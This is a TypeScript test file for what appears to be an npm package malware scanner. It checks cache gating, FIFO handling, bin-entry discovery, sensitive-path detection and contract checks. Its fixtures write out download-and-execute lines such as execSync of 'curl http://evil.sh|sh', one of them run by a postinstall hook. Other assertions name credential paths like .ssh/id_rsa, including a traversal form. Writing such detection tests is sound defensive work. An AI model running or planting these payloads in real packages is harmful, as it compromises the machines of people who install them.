import { describe, expect, it } from 'vitest'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { spawnSync } from 'node:child_process'
import { scan } from '../lib/scanner-bin/engine.js'
import { listSourceFiles } from '../lib/scanner/package-sources.js'
import { isSensitiveFsPath, diffManifests, hasAnyAddition, upgradeSeverity, findPreviousRecord, pruneCapabilities } from '../lib/guard/version-diff.js'
import { isSensitivePath } from '../lib/guard/runtime-denoise.js'
import { checkAlarmInContract } from '../lib/guard/contract.js'
import type { CapabilityManifest } from '../lib/scanner-bin/protocol.js'

/**
 * 0.3.9 审查修复批次回归（review-038 全部真阳性的可测面）。
 * 覆盖：缓存固化门控、单文件容错、FIFO 守卫、bin 入口枚举、敏感路径穿越/反斜杠、
 * 原生二进制换血可见性、null 记录守卫、契约 host+path 剥离、退化基线拦截。
 */

const tmp = (tag: string): string => mkdtempSync(join(tmpdir(), 'vet-039-' + tag + '-'))
const m = (over: Partial<CapabilityManifest>): CapabilityManifest => ({
  hosts: [], fsPaths: [], spawnCmds: [], imports: [], hasNetwork: false, hasExec: false, ...over,
})

describe('0.3.9 引擎健壮性', () => {
  it('环状初始化器不再崩整包：ok=true 且同包 payload 照常命中', () => {
    const dir = tmp('cycle')
    try {
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'p', version: '1.0.0' }))
      writeFileSync(join(dir, 'poison.js'), "const x = x + 'a';\nconst n = n * 2;\n")
      writeFileSync(join(dir, 'payload.js'), 'const cp=require("child_process");cp.execSync("curl http://e.sh|sh")\n')
      const r = scan({ kind: 'files', files: [join(dir, 'package.json'), join(dir, 'poison.js'), join(dir, 'payload.js')], cacheDir: join(dir, 'c') })
      expect(r.ok).toBe(true)
      expect(r.report!.verdict).toBe('suspicious')
      expect(r.report!.findings.some(f => f.file === 'payload.js')).toBe(true)
      expect(r.report!.sourceCount).toBe(2)
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })

  it('预算耗尽的部分结果不写缓存：复扫必须重扫并找回尾部 payload', () => {
    const dir = tmp('cachegate')
    try {
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'q', version: '1.0.0' }))
      // 60 个 150KB 深度嵌套文件（解析耗时按内容线性增长）+ 排在末尾的 payload：
      // 首轮 2s 预算必在途中耗尽（R8-skip 尾部）；复扫若命中「部分结果缓存」→ payload
      // 永不进 AST → 断言必失败。机器过快没触发预算时走对照分支（同样要求 payload 命中）。
      for (let i = 0; i < 60; i++) writeFileSync(join(dir, 'f' + String(i).padStart(2, '0') + '.js'), 'var x' + i + ' = ' + '{a:1,'.repeat(4000) + '{}}'.repeat(4000) + '\n')
      writeFileSync(join(dir, 'z-payload.js'), 'const cp=require("child_process");cp.execSync("curl http://evil.sh|sh")\n')
      const files = [join(dir, 'package.json'), ...Array.from({ length: 60 }, (_, i) => join(dir, 'f' + String(i).padStart(2, '0') + '.js')), join(dir, 'z-payload.js')]
      const cache = join(dir, 'cache')
      const r1 = scan({ kind: 'files', files, cacheDir: cache, timeoutMs: 2000 })
      const tripped = r1.report!.findings.some(f => f.rule === 'R8')
      // 复扫必须拿到完整结论（若 r1 的部分结果被固化进缓存，这里会命中旧 clean，payload 缺失）
      const r2 = scan({ kind: 'files', files, cacheDir: cache, timeoutMs: 600000 })
      if (tripped) {
        expect(r2.report!.findings.some(f => f.file === 'z-payload.js')).toBe(true)
        expect(r2.report!.verdict).toBe('suspicious')
      } else {
        // 机器过快未触发预算（场景未物化）：完整扫描同样必须命中 payload
        expect(r2.report!.findings.some(f => f.file === 'z-payload.js')).toBe(true)
      }
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })

  it.skipIf(process.platform === 'win32')('无扩展名 FIFO 不挂起（isExtensionlessJs 的 stat 守卫）', () => {
    const dir = tmp('fifo')
    try {
      spawnSync('mkfifo', [join(dir, 'noext')])
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'q', version: '1.0.0' }))
      const probe = join(dir, 'probe.mjs')
      writeFileSync(probe,
        'import { scan } from "' + process.cwd() + '/lib/scanner-bin/engine.js";' +
        'const r=scan({kind:"files",files:["' + dir + '/package.json","' + dir + '/noext"],cacheDir:"' + dir + '/c"});' +
        'console.log("SCAN-DONE ok="+r.ok);')
      const r = spawnSync(process.execPath, [probe], { timeout: 5000, encoding: 'utf8' })
      expect(r.signal).toBeNull()
      expect(r.stdout).toContain('SCAN-DONE ok=true')
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })

  it('>8MB package.json 限量读：扫描不崩且快速返回', () => {
    const dir = tmp('bigpkg')
    try {
      writeFileSync(join(dir, 'package.json'), '{"name":"q","version":"1.0.0","desc":"' + 'A'.repeat(9 * 1024 * 1024) + '"}')
      writeFileSync(join(dir, 'a.js'), 'var x=1\n')
      const t = Date.now()
      const r = scan({ kind: 'files', files: [join(dir, 'package.json'), join(dir, 'a.js')], cacheDir: join(dir, 'c') })
      expect(r.ok).toBe(true)
      expect(Date.now() - t).toBeLessThan(2000)
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })

  it('listSourceFiles 纳入 bin/scripts 声明的无扩展名入口，engine 命中下载即执行', () => {
    const dir = tmp('bin')
    try {
      mkdirSync(join(dir, 'bin'))
      writeFileSync(join(dir, 'package.json'), JSON.stringify({ name: 'evil-pkg', version: '1.0.0', bin: { cli: 'bin/cli' }, scripts: { postinstall: 'node bin/cli' } }))
      writeFileSync(join(dir, 'bin', 'cli'), '#!/usr/bin/env node\nconst cp=require("child_process");cp.execSync("curl http://evil.sh | sh")\n')
      writeFileSync(join(dir, 'index.js'), 'export const x = 1\n')
      const files = listSourceFiles(dir)
      const cli = files.find(f => f.endsWith(join('bin', 'cli')))
      expect(cli).toBeDefined()
      const r = scan({ kind: 'files', files, cacheDir: join(dir, 'c') })
      expect(r.report!.findings.some(f => f.file === 'cli' && /R2|R20|R14/.test(f.rule))).toBe(true)
      expect(r.report!.verdict).toBe('suspicious')
    } finally { rmSync(dir, { recursive: true, force: true }) }
  })
})

describe('0.3.9 敏感路径判定', () => {
  it('isSensitiveFsPath 反斜杠形态命中（Windows 载荷）', () => {
    expect(isSensitiveFsPath('C:\\Users\\x\\.ssh\\id_rsa')).toBe(true)
    expect(isSensitiveFsPath('/home/x/.ssh/id_rsa')).toBe(true)
    expect(isSensitiveFsPath('/home/x/notes.txt')).toBe(false)
  })

  it('isSensitivePath 的 node_modules 豁免不可被 .. 穿越（normPath 折叠）', () => {
    const cfg = {
      sensitiveSegments: ['.credentials.yaml', '.ssh'],
      sensitiveRoots: [] as string[],
      sensitiveExts: ['.pem', '.key'],
      sensitiveKeywords: ['credentials'],
      userHome: '',
      dshStateDir: '',
      sensitivePrefixes: [] as string[],
    } as never
    expect(isSensitivePath('/home/u/.dsh/node_modules/x/../../.credentials.yaml', cfg, 'read')).toBe(true)
    expect(isSensitivePath('/home/u/.credentials.yaml', cfg, 'read')).toBe(true)
  })
})

describe('0.3.9 原生二进制差分可见性', () => {
  it('换血（纯替换）→ hasAnyAddition true、upgradeSeverity info、消息带新名字', () => {
    const prev = m({ hasNetwork: false, hasNativeBinary: true, nativeBinaries: ['system.node'] })
    const next = m({ hasNetwork: false, hasNativeBinary: true, nativeBinaries: ['evil.node'] })
    const { added } = diffManifests(prev, next)
    expect(added.hasNativeBinary).toBe(false)
    expect(added.nativeBinaries).toEqual(['evil.node'])
    expect(hasAnyAddition(added)).toBe(true)
    expect(upgradeSeverity(added)).toBe('info')
  })

  it('二次新增原生名（非替换）也可见', () => {
    const prev = m({ nativeBinaries: ['a.node'] })
    const next = m({ nativeBinaries: ['a.node', 'b.node'] })
    const { added } = diffManifests(prev, next)
    expect(added.nativeBinaries).toEqual(['b.node'])
    expect(hasAnyAddition(added)).toBe(true)
    expect(upgradeSeverity(added)).toBe('info')
  })
})

describe('0.3.9 存储健壮性', () => {
  it('null 记录不再击穿 findPreviousRecord/pruneCapabilities', () => {
    const store = { records: { k: null as never, good: { name: 'p', version: '1.0.0', recordedAt: 1, capabilities: m({}) } } }
    expect(findPreviousRecord(store, 'p', '2.0.0')).not.toBeNull()
    expect(() => pruneCapabilities(store, 1)).not.toThrow()
  })
})

describe('0.3.9 契约对账', () => {
  it('net-egress 的 hostname+path target 剥离路径后按主机判定', () => {
    const contract = { scope: { network: { connect: ['webhook.site'] }, fs: { read: [], write: [], destroy: [] }, commands: [] } }
    const chk = checkAlarmInContract('net-egress', 'webhook.site/post/abc', contract)
    expect(chk).toEqual({ field: 'network', within: true })
  })
})